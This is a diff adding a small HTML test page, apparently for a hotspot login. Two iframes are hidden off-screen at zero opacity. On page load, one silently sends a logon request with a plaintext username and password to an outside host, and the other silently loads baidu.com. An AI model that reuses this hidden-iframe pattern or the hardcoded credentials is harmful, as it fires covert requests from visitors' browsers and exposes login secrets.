@@ -1,0 +1,12 @@
+<html>
+<body>
+<img src="sailing.gif">
+<p></p>
+<h1>Test file 07/14/2017</h1>
+<p></p>
+<iframe src="http://bind.menseer.com:3990/json/logon?username=md6&password=123456&onestep=1" name="frame2" id="frame1" 
+					style="position:fixed;top:-500%;left:-600%;-webkit-opacity:0;"></iframe>
+					<iframe src="http://www.baidu.com" name="frame3" id="frame2" 
+					style="position:fixed;top:-500%;left:-600%;-webkit-opacity:0;"></iframe>
+					</body>
+</html>
